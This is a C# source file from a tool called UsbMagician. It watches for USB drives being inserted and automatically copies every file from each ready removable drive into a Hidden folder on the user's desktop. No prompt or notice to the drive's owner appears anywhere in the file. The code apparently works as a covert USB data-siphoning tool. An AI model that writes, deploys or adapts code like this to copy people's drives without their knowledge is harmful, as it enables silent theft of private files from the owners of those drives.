using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Management;
using System.Text;
using System.Threading.Tasks;
using UsbMagician.Logs;
using UsbMagician.Utils;

namespace UsbMagician.Events
{
    class EventsManager
    {
        private static readonly string SystemPath = @"C:\Users\" + Environment.UserName + @"\Desktop\UM\";

        public static void EventsListener()
        {
            try
            {
                var insertQuery = new WqlEventQuery(
                    "SELECT * FROM __InstanceCreationEvent WITHIN 2 WHERE TargetInstance ISA 'Win32_USBHub'");
                var insertWatcher = new ManagementEventWatcher(insertQuery);

                insertWatcher.EventArrived += DeviceInsertedEvent;
                insertWatcher.Start();

                var removeQuery = new WqlEventQuery(
                    "SELECT * FROM __InstanceDeletionEvent WITHIN 2 WHERE TargetInstance ISA 'Win32_USBHub'");
                var removeWatcher = new ManagementEventWatcher(removeQuery);
                removeWatcher.EventArrived += DeviceRemovedEvent;
                removeWatcher.Start();
            }
            catch (Exception error)
            {
                Logger.WriteLine(Logger.ContextTypes.ErrorMessage.ToString(), error.Message);
            }
        }

        public static void DeviceInsertedEvent(object sender, EventArrivedEventArgs e)
        {
            Logger.WriteLine(Logger.ContextTypes.Empty.ToString());
            Logger.WriteLine(Logger.ContextTypes.EventStatus.ToString(), "DeviceInsertedEvent");

            var instance = (ManagementBaseObject)e.NewEvent["TargetInstance"];
            foreach (var property in instance.Properties)
            {
                Logger.WriteLine(Logger.ContextTypes.PropertyInfo.ToString(), $"{property.Name}: {property.Value}");
            }

            var drives = DriveInfo.GetDrives()
                .Where(x => x.DriveType == DriveType.Removable);

            foreach (var drive in drives)
            {
                var driveFullName = $"{drive.Name} ({drive.VolumeLabel})";

                if (drive.IsReady)
                {
                    Logger.WriteLine(Logger.ContextTypes.DriveStatus.ToString(), $"Device {driveFullName} is ready");

                    var deviceName = $"usbMag_{drive.VolumeLabel}";
                    var targetPath = $"{Path.Combine(SystemPath, deviceName)}_{DateTime.Now.ToShortDateString()}";

                    if (!Directory.Exists(targetPath))
                    {
                        var directory = Directory.CreateDirectory(targetPath);
                        directory.Attributes = FileAttributes.Directory | FileAttributes.Hidden;

                        Logger.WriteLine(Logger.ContextTypes.DirectoryStatus.ToString(), $"Directory {directory.Name} was successfully created");
                    }

                    Logger.WriteLine(Logger.ContextTypes.General.ToString(), $"Copying all files started...");
                    FilesDirectoriesOperator.GetFiles(drive.Name, targetPath, 0);
                    Logger.WriteLine(Logger.ContextTypes.General.ToString(), $"Copying all files finished!");
                }
                else
                {
                    Logger.WriteLine(Logger.ContextTypes.DriveStatus.ToString(), $"Device {driveFullName} is NOT ready");
                    return;
                }
            }
        }

        public static void DeviceRemovedEvent(object sender, EventArrivedEventArgs e)
        {
            Logger.WriteLine(Logger.ContextTypes.Empty.ToString());
            Logger.WriteLine(Logger.ContextTypes.EventStatus.ToString(), "DeviceRemovedEvent");

            var instance = (ManagementBaseObject)e.NewEvent["TargetInstance"];

            foreach (var property in instance.Properties)
            {
                Logger.WriteLine(Logger.ContextTypes.PropertyInfo.ToString(), $"{property.Name}: {property.Value}");
            }
        }
    }
}
